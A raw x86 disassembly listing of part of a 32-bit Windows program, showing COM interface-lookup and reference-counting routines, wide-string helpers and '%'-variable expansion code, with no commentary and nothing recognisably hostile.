  402f58:	lea    eax,[ebp-0x210]
  402f5e:	push   eax
  402f5f:	lea    ecx,[ebp-0x21c]
  402f65:	call   0x402abc
  402f6a:	mov    eax,DWORD PTR [ebp-0x21c]
  402f70:	and    DWORD PTR [ebp-0x21c],0x0
  402f77:	push   ecx
  402f78:	push   ecx
  402f79:	mov    ds:0x407040,eax
  402f7e:	call   0x402b35
  402f83:	mov    eax,DWORD PTR [ebp-0x210]
  402f89:	test   eax,eax
  402f8b:	je     0x402f9d
  402f8d:	mov    ecx,DWORD PTR [eax]
  402f8f:	push   eax
  402f90:	mov    esi,DWORD PTR [ecx+0x8]
  402f93:	mov    ecx,esi
  402f95:	call   DWORD PTR ds:0x4081a0
  402f9b:	call   esi
  402f9d:	mov    eax,DWORD PTR [ebp-0x21c]
  402fa3:	test   eax,eax
  402fa5:	je     0x402fb7
  402fa7:	mov    ecx,DWORD PTR [eax]
  402fa9:	push   eax
  402faa:	mov    esi,DWORD PTR [ecx+0x8]
  402fad:	mov    ecx,esi
  402faf:	call   DWORD PTR ds:0x4081a0
  402fb5:	call   esi
  402fb7:	mov    eax,DWORD PTR [ebp-0x218]
  402fbd:	push   eax
  402fbe:	mov    ecx,DWORD PTR [eax]
  402fc0:	mov    esi,DWORD PTR [ecx+0x8]
  402fc3:	mov    ecx,esi
  402fc5:	call   DWORD PTR ds:0x4081a0
  402fcb:	call   esi
  402fcd:	mov    eax,DWORD PTR [ebp-0x214]
  402fd3:	test   eax,eax
  402fd5:	je     0x402fe7
  402fd7:	mov    ecx,DWORD PTR [eax]
  402fd9:	push   eax
  402fda:	mov    esi,DWORD PTR [ecx+0x8]
  402fdd:	mov    ecx,esi
  402fdf:	call   DWORD PTR ds:0x4081a0
  402fe5:	call   esi
  402fe7:	mov    eax,ds:0x407040
  402fec:	jmp    0x402ff0
  402fee:	xor    edi,edi
  402ff0:	test   eax,eax
  402ff2:	je     0x403005
  402ff4:	cmp    DWORD PTR ds:0x407048,0x0
  402ffb:	jne    0x403005
  402ffd:	push   eax
  402ffe:	call   0x402c35
  403003:	mov    edi,eax
  403005:	push   ebx
  403006:	call   DWORD PTR ds:0x40805c
  40300c:	mov    eax,edi
  40300e:	pop    edi
  40300f:	pop    esi
  403010:	pop    ebx
  403011:	mov    ecx,DWORD PTR [ebp-0x4]
  403014:	xor    ecx,ebp
  403016:	call   0x406340
  40301b:	mov    esp,ebp
  40301d:	pop    ebp
  40301e:	ret    0x4
  403021:	int3   
  403022:	int3   
  403023:	int3   
  403024:	int3   
  403025:	int3   
  403026:	mov    edi,edi
  403028:	push   ebp
  403029:	mov    ebp,esp
  40302b:	push   ecx
  40302c:	mov    eax,ds:0x407008
  403031:	xor    eax,ebp
  403033:	mov    DWORD PTR [ebp-0x4],eax
  403036:	push   esi
  403037:	mov    esi,DWORD PTR [ebp+0xc]
  40303a:	test   esi,esi
  40303c:	jne    0x403045
  40303e:	mov    eax,0x80004003
  403043:	jmp    0x40307f
  403045:	mov    eax,ds:0x407040
  40304a:	xor    ecx,ecx
  40304c:	test   eax,eax
  40304e:	jne    0x40305f
  403050:	push   DWORD PTR [ebp+0x8]
  403053:	call   0x402ddc
  403058:	mov    ecx,eax
  40305a:	mov    eax,ds:0x407040
  40305f:	mov    DWORD PTR [esi],eax
  403061:	mov    edx,DWORD PTR ds:0x407040
  403067:	test   edx,edx
  403069:	je     0x40307d
  40306b:	mov    eax,DWORD PTR [edx]
  40306d:	push   edx
  40306e:	mov    esi,DWORD PTR [eax+0x4]
  403071:	mov    ecx,esi
  403073:	call   DWORD PTR ds:0x4081a0
  403079:	call   esi
  40307b:	xor    ecx,ecx
  40307d:	mov    eax,ecx
  40307f:	mov    ecx,DWORD PTR [ebp-0x4]
  403082:	xor    ecx,ebp
  403084:	pop    esi
  403085:	call   0x406340
  40308a:	mov    esp,ebp
  40308c:	pop    ebp
  40308d:	ret    0x8
  403090:	int3   
  403091:	int3   
  403092:	int3   
  403093:	int3   
  403094:	int3   
  403095:	int3   
  403096:	int3   
  403097:	int3   
  403098:	int3   
  403099:	int3   
  40309a:	int3   
  40309b:	int3   
  40309c:	int3   
  40309d:	int3   
  40309e:	int3   
  40309f:	int3   
  4030a0:	ret    0x4
  4030a3:	int3   
  4030a4:	int3   
  4030a5:	int3   
  4030a6:	int3   
  4030a7:	int3   
  4030a8:	xor    eax,eax
  4030aa:	cmp    DWORD PTR [ecx],eax
  4030ac:	jne    0x4030c6
  4030ae:	cmp    DWORD PTR [ecx+0x4],eax
  4030b1:	jne    0x4030c6
  4030b3:	cmp    DWORD PTR [ecx+0x8],0xc0
  4030ba:	jne    0x4030c6
  4030bc:	cmp    DWORD PTR [ecx+0xc],0x46000000
  4030c3:	jne    0x4030c6
  4030c5:	inc    eax
  4030c6:	ret    
  4030c7:	int3   
  4030c8:	int3   
  4030c9:	int3   
  4030ca:	int3   
  4030cb:	int3   
  4030cc:	mov    eax,DWORD PTR [ecx]
  4030ce:	cmp    eax,DWORD PTR [edx]
  4030d0:	jne    0x4030ee
  4030d2:	mov    eax,DWORD PTR [ecx+0x4]
  4030d5:	cmp    eax,DWORD PTR [edx+0x4]
  4030d8:	jne    0x4030ee
  4030da:	mov    eax,DWORD PTR [ecx+0x8]
  4030dd:	cmp    eax,DWORD PTR [edx+0x8]
  4030e0:	jne    0x4030ee
  4030e2:	mov    eax,DWORD PTR [ecx+0xc]
  4030e5:	cmp    eax,DWORD PTR [edx+0xc]
  4030e8:	jne    0x4030ee
  4030ea:	xor    eax,eax
  4030ec:	inc    eax
  4030ed:	ret    
  4030ee:	xor    eax,eax
  4030f0:	ret    
  4030f1:	int3   
  4030f2:	int3   
  4030f3:	int3   
  4030f4:	int3   
  4030f5:	int3   
  4030f6:	mov    edi,edi
  4030f8:	push   ebp
  4030f9:	mov    ebp,esp
  4030fb:	sub    esp,0xc
  4030fe:	mov    eax,ds:0x407008
  403103:	xor    eax,ebp
  403105:	mov    DWORD PTR [ebp-0x4],eax
  403108:	push   ebx
  403109:	push   esi
  40310a:	push   edi
  40310b:	mov    edi,edx
  40310d:	mov    edx,ecx
  40310f:	mov    DWORD PTR [ebp-0x8],edx
  403112:	test   edx,edx
  403114:	je     0x4031b5
  40311a:	test   edi,edi
  40311c:	je     0x4031b5
  403122:	mov    ebx,DWORD PTR [ebp+0xc]
  403125:	test   ebx,ebx
  403127:	jne    0x403133
  403129:	mov    eax,0x80004003
  40312e:	jmp    0x4031ba
  403133:	and    DWORD PTR [ebx],0x0
  403136:	mov    ecx,DWORD PTR [ebp+0x8]
  403139:	call   0x4030a8
  40313e:	test   eax,eax
  403140:	je     0x4031a7
  403142:	mov    edi,DWORD PTR [edi+0x4]
  403145:	add    edi,edx
  403147:	push   edi
  403148:	mov    eax,DWORD PTR [edi]
  40314a:	mov    esi,DWORD PTR [eax+0x4]
  40314d:	mov    ecx,esi
  40314f:	call   DWORD PTR ds:0x4081a0
  403155:	call   esi
  403157:	mov    DWORD PTR [ebx],edi
  403159:	xor    eax,eax
  40315b:	jmp    0x4031ba
  40315d:	mov    ecx,DWORD PTR [edi]
  40315f:	xor    eax,eax
  403161:	test   ecx,ecx
  403163:	sete   al
  403166:	mov    DWORD PTR [ebp-0xc],eax
  403169:	test   eax,eax
  40316b:	jne    0x40317c
  40316d:	mov    edx,DWORD PTR [ebp+0x8]
  403170:	call   0x4030cc
  403175:	test   eax,eax
  403177:	je     0x4031a1
  403179:	mov    edx,DWORD PTR [ebp-0x8]
  40317c:	cmp    esi,0x1
  40317f:	je     0x403142
  403181:	push   DWORD PTR [edi+0x4]
  403184:	mov    ecx,esi
  403186:	push   ebx
  403187:	push   DWORD PTR [ebp+0x8]
  40318a:	push   edx
  40318b:	call   DWORD PTR ds:0x4081a0
  403191:	call   esi
  403193:	test   eax,eax
  403195:	je     0x4031ba
  403197:	cmp    DWORD PTR [ebp-0xc],0x0
  40319b:	jne    0x4031a1
  40319d:	test   eax,eax
  40319f:	js     0x4031ba
  4031a1:	mov    edx,DWORD PTR [ebp-0x8]
  4031a4:	add    edi,0xc
  4031a7:	mov    esi,DWORD PTR [edi+0x8]
  4031aa:	test   esi,esi
  4031ac:	jne    0x40315d
  4031ae:	mov    eax,0x80004002
  4031b3:	jmp    0x4031ba
  4031b5:	mov    eax,0x80070057
  4031ba:	mov    ecx,DWORD PTR [ebp-0x4]
  4031bd:	pop    edi
  4031be:	pop    esi
  4031bf:	xor    ecx,ebp
  4031c1:	pop    ebx
  4031c2:	call   0x406340
  4031c7:	mov    esp,ebp
  4031c9:	pop    ebp
  4031ca:	ret    0x8
  4031cd:	int3   
  4031ce:	int3   
  4031cf:	int3   
  4031d0:	int3   
  4031d1:	int3   
  4031d2:	int3   
  4031d3:	int3   
  4031d4:	int3   
  4031d5:	int3   
  4031d6:	int3   
  4031d7:	int3   
  4031d8:	int3   
  4031d9:	int3   
  4031da:	int3   
  4031db:	int3   
  4031dc:	int3   
  4031dd:	int3   
  4031de:	int3   
  4031df:	int3   
  4031e0:	mov    edi,edi
  4031e2:	push   ebp
  4031e3:	mov    ebp,esp
  4031e5:	mov    eax,DWORD PTR [ebp+0x10]
  4031e8:	test   eax,eax
  4031ea:	je     0x4031ef
  4031ec:	and    DWORD PTR [eax],0x0
  4031ef:	mov    eax,0x80004001
  4031f4:	pop    ebp
  4031f5:	ret    0xc
  4031f8:	int3   
  4031f9:	int3   
  4031fa:	int3   
  4031fb:	int3   
  4031fc:	int3   
  4031fd:	int3   
  4031fe:	int3   
  4031ff:	int3   
  403200:	xor    eax,eax
  403202:	inc    eax
  403203:	ret    0x4
  403206:	int3   
  403207:	int3   
  403208:	int3   
  403209:	int3   
  40320a:	int3   
  40320b:	int3   
  40320c:	int3   
  40320d:	int3   
  40320e:	int3   
  40320f:	int3   
  403210:	xor    eax,eax
  403212:	ret    0x4
  403215:	int3   
  403216:	int3   
  403217:	int3   
  403218:	int3   
  403219:	int3   
  40321a:	int3   
  40321b:	int3   
  40321c:	int3   
  40321d:	int3   
  40321e:	int3   
  40321f:	int3   
  403220:	mov    edi,edi
  403222:	push   ebp
  403223:	mov    ebp,esp
  403225:	push   esi
  403226:	mov    esi,ecx
  403228:	call   0x4032f9
  40322d:	test   BYTE PTR [ebp+0x8],0x1
  403231:	je     0x40323a
  403233:	push   esi
  403234:	call   0x405f80
  403239:	pop    ecx
  40323a:	mov    eax,esi
  40323c:	pop    esi
  40323d:	pop    ebp
  40323e:	ret    0x4
  403241:	int3   
  403242:	int3   
  403243:	int3   
  403244:	int3   
  403245:	int3   
  403246:	mov    edi,edi
  403248:	push   esi
  403249:	mov    esi,ecx
  40324b:	cmp    DWORD PTR [esi],0x0
  40324e:	je     0x40325c
  403250:	push   DWORD PTR [esi]
  403252:	call   DWORD PTR ds:0x40813c
  403258:	and    DWORD PTR [esi],0x0
  40325b:	pop    ecx
  40325c:	cmp    DWORD PTR [esi+0x4],0x0
  403260:	je     0x403270
  403262:	push   DWORD PTR [esi+0x4]
  403265:	call   DWORD PTR ds:0x40813c
  40326b:	and    DWORD PTR [esi+0x4],0x0
  40326f:	pop    ecx
  403270:	and    DWORD PTR [esi+0x8],0x0
  403274:	pop    esi
  403275:	ret    
  403276:	int3   
  403277:	int3   
  403278:	int3   
  403279:	int3   
  40327a:	int3   
  40327b:	mov    edi,edi
  40327d:	push   esi
  40327e:	push   edi
  40327f:	mov    edi,ecx
  403281:	xor    esi,esi
  403283:	mov    eax,DWORD PTR [edi+0x8]
  403286:	test   eax,eax
  403288:	jle    0x4032b6
  40328a:	test   esi,esi
  40328c:	js     0x4032c2
  40328e:	cmp    esi,eax
  403290:	jge    0x4032c2
  403292:	mov    eax,DWORD PTR [edi]
  403294:	push   DWORD PTR [eax+esi*4]
  403297:	call   0x405f8a
  40329c:	pop    ecx
  40329d:	cmp    esi,DWORD PTR [edi+0x8]
  4032a0:	jge    0x4032c2
  4032a2:	mov    eax,DWORD PTR [edi+0x4]
  4032a5:	push   DWORD PTR [eax+esi*4]
  4032a8:	call   0x405f8a
  4032ad:	mov    eax,DWORD PTR [edi+0x8]
  4032b0:	inc    esi
  4032b1:	pop    ecx
  4032b2:	cmp    esi,eax
  4032b4:	jl     0x40328a
  4032b6:	mov    ecx,edi
  4032b8:	call   0x403246
  4032bd:	pop    edi
  4032be:	xor    eax,eax
  4032c0:	pop    esi
  4032c1:	ret    
  4032c2:	mov    ecx,0xc000008c
  4032c7:	call   0x403d91
  4032cc:	int3   
  4032cd:	int3   
  4032ce:	int3   
  4032cf:	int3   
  4032d0:	int3   
  4032d1:	int3   
  4032d2:	int3   
  4032d3:	int3   
  4032d4:	int3   
  4032d5:	int3   
  4032d6:	int3   
  4032d7:	int3   
  4032d8:	int3   
  4032d9:	int3   
  4032da:	int3   
  4032db:	int3   
  4032dc:	int3   
  4032dd:	int3   
  4032de:	int3   
  4032df:	int3   
  4032e0:	mov    edi,edi
  4032e2:	push   ebp
  4032e3:	mov    ebp,esp
  4032e5:	mov    ecx,DWORD PTR [ebp+0x8]
  4032e8:	lea    ecx,[ecx+0x4]
  4032eb:	call   0x40327b
  4032f0:	pop    ebp
  4032f1:	ret    0x4
  4032f4:	int3   
  4032f5:	int3   
  4032f6:	int3   
  4032f7:	int3   
  4032f8:	int3   
  4032f9:	mov    edi,edi
  4032fb:	push   esi
  4032fc:	lea    esi,[ecx+0x4]
  4032ff:	mov    DWORD PTR [ecx],0x401358
  403305:	mov    ecx,esi
  403307:	call   0x40327b
  40330c:	mov    ecx,esi
  40330e:	call   0x40327b
  403313:	mov    ecx,esi
  403315:	pop    esi
  403316:	jmp    0x403246
  40331b:	int3   
  40331c:	int3   
  40331d:	int3   
  40331e:	int3   
  40331f:	int3   
  403320:	test   ecx,ecx
  403322:	jne    0x403327
  403324:	xor    eax,eax
  403326:	ret    
  403327:	lea    edx,[ecx+0x2]
  40332a:	mov    ax,WORD PTR [ecx]
  40332d:	add    ecx,0x2
  403330:	test   ax,ax
  403333:	jne    0x40332a
  403335:	sub    ecx,edx
  403337:	sar    ecx,1
  403339:	mov    eax,ecx
  40333b:	ret    
  40333c:	int3   
  40333d:	int3   
  40333e:	int3   
  40333f:	int3   
  403340:	int3   
  403341:	mov    edi,edi
  403343:	push   ebp
  403344:	mov    ebp,esp
  403346:	push   esi
  403347:	mov    esi,ecx
  403349:	push   0x4
  40334b:	mov    eax,DWORD PTR [esi+0x8]
  40334e:	inc    eax
  40334f:	push   eax
  403350:	push   DWORD PTR [esi]
  403352:	call   DWORD PTR ds:0x407000
  403358:	add    esp,0xc
  40335b:	test   eax,eax
  40335d:	jne    0x403363
  40335f:	xor    eax,eax
  403361:	jmp    0x4033a6
  403363:	mov    DWORD PTR [esi],eax
  403365:	mov    eax,DWORD PTR [esi+0x8]
  403368:	push   0x4
  40336a:	inc    eax
  40336b:	push   eax
  40336c:	push   DWORD PTR [esi+0x4]
  40336f:	call   DWORD PTR ds:0x407000
  403375:	add    esp,0xc
  403378:	test   eax,eax
  40337a:	je     0x40335f
  40337c:	mov    edx,DWORD PTR [esi+0x8]
  40337f:	mov    ecx,DWORD PTR [esi]
  403381:	shl    edx,0x2
  403384:	mov    DWORD PTR [esi+0x4],eax
  403387:	add    ecx,edx
  403389:	je     0x403392
  40338b:	mov    eax,DWORD PTR [ebp+0x8]
  40338e:	mov    eax,DWORD PTR [eax]
  403390:	mov    DWORD PTR [ecx],eax
  403392:	mov    ecx,DWORD PTR [esi+0x4]
  403395:	add    ecx,edx
  403397:	je     0x4033a0
  403399:	mov    eax,DWORD PTR [ebp+0xc]
  40339c:	mov    eax,DWORD PTR [eax]
  40339e:	mov    DWORD PTR [ecx],eax
  4033a0:	inc    DWORD PTR [esi+0x8]
  4033a3:	xor    eax,eax
  4033a5:	inc    eax
  4033a6:	pop    esi
  4033a7:	pop    ebp
  4033a8:	ret    0x8
  4033ab:	int3   
  4033ac:	int3   
  4033ad:	int3   
  4033ae:	int3   
  4033af:	int3   
  4033b0:	mov    edi,edi
  4033b2:	push   ebp
  4033b3:	mov    ebp,esp
  4033b5:	sub    esp,0x14
  4033b8:	cmp    DWORD PTR [ebp+0x8],0x0
  4033bc:	mov    DWORD PTR [ebp-0x14],ecx
  4033bf:	je     0x4034a8
  4033c5:	cmp    DWORD PTR [ebp+0xc],0x0
  4033c9:	je     0x4034a8
  4033cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4033d2:	push   ebx
  4033d3:	push   esi
  4033d4:	push   edi
  4033d5:	push   0x2
  4033d7:	xor    ebx,ebx
  4033d9:	lea    edx,[ecx+0x2]
  4033dc:	pop    esi
  4033dd:	mov    ax,WORD PTR [ecx]
  4033e0:	add    ecx,esi
  4033e2:	cmp    ax,bx
  4033e5:	jne    0x4033dd
  4033e7:	sub    ecx,edx
  4033e9:	sar    ecx,1
  4033eb:	lea    eax,[ecx*2+0x2]
  4033f2:	xor    ecx,ecx
  4033f4:	mov    DWORD PTR [ebp-0x4],eax
  4033f7:	mul    esi
  4033f9:	seto   cl
  4033fc:	neg    ecx
  4033fe:	or     ecx,eax
  403400:	push   ecx
  403401:	call   0x405f94
  403406:	pop    ecx
  403407:	mov    ecx,DWORD PTR [ebp+0xc]
  40340a:	mov    edi,eax
  40340c:	mov    DWORD PTR [ebp-0x10],edi
  40340f:	call   0x403320
  403414:	xor    ecx,ecx
  403416:	lea    eax,[eax*2+0x2]
  40341d:	mov    DWORD PTR [ebp-0x8],eax
  403420:	mul    esi
  403422:	seto   cl
  403425:	neg    ecx
  403427:	or     ecx,eax
  403429:	push   ecx
  40342a:	call   0x405f94
  40342f:	mov    esi,eax
  403431:	mov    DWORD PTR [ebp-0xc],esi
  403434:	pop    ecx
  403435:	test   edi,edi
  403437:	je     0x403489
  403439:	test   esi,esi
  40343b:	je     0x403489
  40343d:	mov    eax,DWORD PTR [ebp-0x4]
  403440:	push   eax
  403441:	push   DWORD PTR [ebp+0x8]
  403444:	push   eax
  403445:	push   edi
  403446:	call   DWORD PTR ds:0x408138
  40344c:	add    esp,0x10
  40344f:	mov    ecx,eax
  403451:	call   0x403dc5
  403456:	mov    eax,DWORD PTR [ebp-0x8]
  403459:	push   eax
  40345a:	push   DWORD PTR [ebp+0xc]
  40345d:	push   eax
  40345e:	push   esi
  40345f:	call   DWORD PTR ds:0x408138
  403465:	add    esp,0x10
  403468:	mov    ecx,eax
  40346a:	call   0x403dc5
  40346f:	mov    ecx,DWORD PTR [ebp-0x14]
  403472:	lea    eax,[ebp-0xc]
  403475:	push   eax
  403476:	lea    eax,[ebp-0x10]
  403479:	push   eax
  40347a:	call   0x403341
  40347f:	test   eax,eax
  403481:	je     0x403489
  403483:	mov    edi,ebx
  403485:	mov    esi,ebx
  403487:	jmp    0x40348e
  403489:	mov    ebx,0x8007000e
  40348e:	push   esi
  40348f:	call   0x405f8a
  403494:	push   edi
  403495:	call   0x405f8a
  40349a:	pop    ecx
  40349b:	pop    ecx
  40349c:	xor    eax,eax
  40349e:	test   ebx,ebx
  4034a0:	pop    edi
  4034a1:	pop    esi
  4034a2:	setns  al
  4034a5:	pop    ebx
  4034a6:	jmp    0x4034aa
  4034a8:	xor    eax,eax
  4034aa:	mov    esp,ebp
  4034ac:	pop    ebp
  4034ad:	ret    0x8
  4034b0:	int3   
  4034b1:	int3   
  4034b2:	int3   
  4034b3:	int3   
  4034b4:	int3   
  4034b5:	int3   
  4034b6:	int3   
  4034b7:	int3   
  4034b8:	int3   
  4034b9:	int3   
  4034ba:	int3   
  4034bb:	int3   
  4034bc:	int3   
  4034bd:	int3   
  4034be:	int3   
  4034bf:	int3   
  4034c0:	mov    edi,edi
  4034c2:	push   ebp
  4034c3:	mov    ebp,esp
  4034c5:	push   ecx
  4034c6:	cmp    DWORD PTR [ebp+0xc],0x0
  4034ca:	je     0x403503
  4034cc:	cmp    DWORD PTR [ebp+0x10],0x0
  4034d0:	je     0x403503
  4034d2:	mov    ecx,DWORD PTR [ebp+0x8]
  4034d5:	and    DWORD PTR [ebp-0x4],0x0
  4034d9:	push   esi
  4034da:	push   DWORD PTR [ebp+0x10]
  4034dd:	lea    ecx,[ecx+0x4]
  4034e0:	push   DWORD PTR [ebp+0xc]
  4034e3:	call   0x4033b0
  4034e8:	neg    eax
  4034ea:	lea    ecx,[ebp-0x4]
  4034ed:	sbb    esi,esi
  4034ef:	and    esi,0x7ff8fff2
  4034f5:	call   0x403968
  4034fa:	lea    eax,[esi-0x7ff8fff2]
  403500:	pop    esi
  403501:	jmp    0x403508
  403503:	mov    eax,0x80070057
  403508:	mov    esp,ebp
  40350a:	pop    ebp
  40350b:	ret    0xc
  40350e:	int3   
  40350f:	int3   
  403510:	int3   
  403511:	int3   
  403512:	int3   
  403513:	push   DWORD PTR [ecx]
  403515:	call   DWORD PTR ds:0x40813c
  40351b:	pop    ecx
  40351c:	ret    
  40351d:	int3   
  40351e:	int3   
  40351f:	int3   
  403520:	int3   
  403521:	int3   
  403522:	mov    edi,edi
  403524:	push   ebp
  403525:	mov    ebp,esp
  403527:	push   esi
  403528:	push   DWORD PTR [ebp+0x8]
  40352b:	mov    esi,ecx
  40352d:	call   DWORD PTR ds:0x408140
  403533:	pop    ecx
  403534:	test   eax,eax
  403536:	je     0x40353f
  403538:	mov    DWORD PTR [esi],eax
  40353a:	pop    esi
  40353b:	pop    ebp
  40353c:	ret    0x4
  40353f:	mov    ecx,0x8007000e
  403544:	call   0x403da4
  403549:	int3   
  40354a:	int3   
  40354b:	int3   
  40354c:	int3   
  40354d:	int3   
  40354e:	int3   
  40354f:	call   DWORD PTR ds:0x408024
  403555:	test   eax,eax
  403557:	jle    0x403561
  403559:	movzx  eax,ax
  40355c:	or     eax,0x80070000
  403561:	ret    
  403562:	int3   
  403563:	int3   
  403564:	int3   
  403565:	int3   
  403566:	int3   
  403567:	mov    edi,edi
  403569:	push   ebp
  40356a:	mov    ebp,esp
  40356c:	push   ebx
  40356d:	push   esi
  40356e:	push   edi
  40356f:	mov    edi,ecx
  403571:	xor    ebx,ebx
  403573:	mov    esi,ebx
  403575:	cmp    DWORD PTR [edi+0xc],ebx
  403578:	jle    0x403593
  40357a:	mov    eax,DWORD PTR [edi+0x4]
  40357d:	push   DWORD PTR [ebp+0x8]
  403580:	push   DWORD PTR [eax+esi*4]
  403583:	call   DWORD PTR ds:0x408034
  403589:	test   eax,eax
  40358b:	je     0x403596
  40358d:	inc    esi
  40358e:	cmp    esi,DWORD PTR [edi+0xc]
  403591:	jl     0x40357a
  403593:	or     esi,0xffffffff
  403596:	cmp    esi,0xffffffff
  403599:	je     0x4035aa
  40359b:	test   esi,esi
  40359d:	js     0x4035b3
  40359f:	cmp    esi,DWORD PTR [edi+0xc]
  4035a2:	jge    0x4035b3
  4035a4:	mov    eax,DWORD PTR [edi+0x8]
  4035a7:	mov    ebx,DWORD PTR [eax+esi*4]
  4035aa:	pop    edi
  4035ab:	pop    esi
  4035ac:	mov    eax,ebx
  4035ae:	pop    ebx
  4035af:	pop    ebp
  4035b0:	ret    0x4
  4035b3:	mov    ecx,0xc000008c
  4035b8:	call   0x403d91
  4035bd:	int3   
  4035be:	int3   
  4035bf:	int3   
  4035c0:	int3   
  4035c1:	int3   
  4035c2:	int3   
  4035c3:	mov    edi,edi
  4035c5:	push   ebp
  4035c6:	mov    ebp,esp
  4035c8:	push   ebx
  4035c9:	mov    ebx,DWORD PTR [ebp+0xc]
  4035cc:	push   esi
  4035cd:	mov    esi,ecx
  4035cf:	push   edi
  4035d0:	lea    ecx,[ebx+0x1]
  4035d3:	add    ecx,DWORD PTR [esi]
  4035d5:	cmp    ecx,DWORD PTR [esi]
  4035d7:	jle    0x403668
  4035dd:	cmp    ecx,ebx
  4035df:	jle    0x403668
  4035e5:	mov    edi,DWORD PTR [esi+0x4]
  4035e8:	cmp    ecx,edi
  4035ea:	jl     0x403620
  4035ec:	cmp    edi,0x3fffffff
  4035f2:	jg     0x403668
  4035f4:	add    edi,edi
  4035f6:	cmp    ecx,edi
  4035f8:	jge    0x4035ec
  4035fa:	push   0x2
  4035fc:	mov    eax,edi
  4035fe:	pop    ecx
  4035ff:	mul    ecx
  403601:	test   edx,edx
  403603:	ja     0x403668
  403605:	jb     0x40360c
  403607:	cmp    eax,0xffffffff
  40360a:	ja     0x403668
  40360c:	push   eax
  40360d:	push   DWORD PTR [esi+0x8]
  403610:	call   DWORD PTR ds:0x408194
  403616:	test   eax,eax
  403618:	je     0x403668
  40361a:	mov    DWORD PTR [esi+0x8],eax
  40361d:	mov    DWORD PTR [esi+0x4],edi
  403620:	mov    ecx,DWORD PTR [esi]
  403622:	test   ecx,ecx
  403624:	js     0x403668
  403626:	cmp    ecx,DWORD PTR [esi+0x4]
  403629:	jge    0x403668
  40362b:	mov    edx,DWORD PTR [esi+0x4]
  40362e:	sub    edx,ecx
  403630:	cmp    edx,DWORD PTR [esi+0x4]
  403633:	jg     0x403668
  403635:	mov    eax,DWORD PTR [esi+0x8]
  403638:	add    edx,edx
  40363a:	lea    ecx,[eax+ecx*2]
  40363d:	lea    eax,[ebx+ebx*1]
  403640:	push   eax
  403641:	push   DWORD PTR [ebp+0x8]
  403644:	push   edx
  403645:	push   ecx
  403646:	call   DWORD PTR ds:0x408138
  40364c:	add    esp,0x10
  40364f:	mov    ecx,eax
  403651:	call   0x403dc5
  403656:	add    DWORD PTR [esi],ebx
  403658:	xor    edx,edx
  40365a:	mov    eax,DWORD PTR [esi+0x8]
  40365d:	mov    ecx,DWORD PTR [esi]
  40365f:	mov    WORD PTR [eax+ecx*2],dx
  403663:	xor    eax,eax
  403665:	inc    eax
  403666:	jmp    0x40366a
  403668:	xor    eax,eax
  40366a:	pop    edi
  40366b:	pop    esi
  40366c:	pop    ebx
  40366d:	pop    ebp
  40366e:	ret    0x8
  403671:	int3   
  403672:	int3   
  403673:	int3   
  403674:	int3   
  403675:	int3   
  403676:	mov    edi,edi
  403678:	push   ebp
  403679:	mov    ebp,esp
  40367b:	sub    esp,0x5c
  40367e:	mov    eax,ds:0x407008
  403683:	xor    eax,ebp
  403685:	mov    DWORD PTR [ebp-0x4],eax
  403688:	mov    eax,DWORD PTR [ebp+0xc]
  40368b:	push   ebx
  40368c:	push   esi
  40368d:	mov    esi,DWORD PTR [ebp+0x8]
  403690:	mov    ebx,ecx
  403692:	mov    DWORD PTR [ebp-0x54],eax
  403695:	test   esi,esi
  403697:	je     0x403812
  40369d:	test   eax,eax
  40369f:	je     0x403812
  4036a5:	mov    ecx,esi
  4036a7:	push   edi
  4036a8:	xor    edi,edi
  4036aa:	mov    DWORD PTR [eax],edi
  4036ac:	lea    edx,[ecx+0x2]
  4036af:	mov    ax,WORD PTR [ecx]
  4036b2:	add    ecx,0x2
  4036b5:	cmp    ax,di
  4036b8:	jne    0x4036af
  4036ba:	sub    ecx,edx
  4036bc:	sar    ecx,1
  4036be:	lea    eax,[ecx+ecx*1]
  4036c1:	cmp    eax,0x64
  4036c4:	jge    0x4036cb
  4036c6:	mov    eax,0x3e8
  4036cb:	push   0x2
  4036cd:	pop    ecx
  4036ce:	mov    DWORD PTR [ebp-0x4c],eax
  4036d1:	mul    ecx
  4036d3:	mov    DWORD PTR [ebp-0x50],edi
  4036d6:	cmp    edx,edi
  4036d8:	ja     0x4037fc
  4036de:	cmp    eax,0xffffffff
  4036e1:	ja     0x4037fc
  4036e7:	push   eax
  4036e8:	call   DWORD PTR ds:0x408190
  4036ee:	mov    DWORD PTR [ebp-0x48],eax
  4036f1:	test   eax,eax
  4036f3:	je     0x4037ff
  4036f9:	xor    ecx,ecx
  4036fb:	mov    WORD PTR [eax],cx
  4036fe:	mov    DWORD PTR [ebx],esi
  403700:	cmp    WORD PTR [esi],di
  403703:	je     0x4037e1
  403709:	push   0x25
  40370b:	pop    esi
  40370c:	mov    eax,DWORD PTR [ebx]
  40370e:	cmp    WORD PTR [eax],si
  403711:	jne    0x403721
  403713:	push   eax
  403714:	call   DWORD PTR ds:0x4080d8
  40371a:	mov    DWORD PTR [ebx],eax
  40371c:	cmp    WORD PTR [eax],si
  40371f:	jne    0x403739
  403721:	push   0x1
  403723:	push   eax
  403724:	lea    ecx,[ebp-0x50]
  403727:	call   0x4035c3
  40372c:	test   eax,eax
  40372e:	je     0x4037ff
  403734:	jmp    0x4037ce
  403739:	mov    edx,esi
  40373b:	mov    ecx,eax
  40373d:	call   0x40382e
  403742:	mov    DWORD PTR [ebp-0x58],eax
  403745:	test   eax,eax
  403747:	je     0x4037f5
  40374d:	mov    ecx,eax
  40374f:	sub    ecx,DWORD PTR [ebx]
  403751:	sar    ecx,1
  403753:	cmp    ecx,0x1f
  403756:	jg     0x4037ee
  40375c:	push   ecx
  40375d:	push   DWORD PTR [ebx]
  40375f:	lea    eax,[ebp-0x44]
  403762:	push   0x20
  403764:	push   eax
  403765:	call   DWORD PTR ds:0x408154
  40376b:	add    esp,0x10
  40376e:	mov    ecx,eax
  403770:	call   0x403dc5
  403775:	mov    ecx,DWORD PTR [ebx+0x4]
  403778:	lea    eax,[ebp-0x44]
  40377b:	push   eax
  40377c:	call   0x403567
  403781:	mov    edx,eax
  403783:	test   edx,edx
  403785:	je     0x4037f5
  403787:	mov    ecx,edx
  403789:	mov    DWORD PTR [ebp-0x5c],edi
  40378c:	lea    esi,[ecx+0x2]
  40378f:	mov    ax,WORD PTR [ecx]
  403792:	add    ecx,0x2
  403795:	cmp    ax,di
  403798:	jne    0x40378f
  40379a:	sub    ecx,esi
  40379c:	sar    ecx,1
  40379e:	push   ecx
  40379f:	push   edx
  4037a0:	lea    ecx,[ebp-0x50]
  4037a3:	call   0x4035c3
  4037a8:	lea    ecx,[ebp-0x5c]
  4037ab:	mov    esi,eax
  4037ad:	call   0x403968
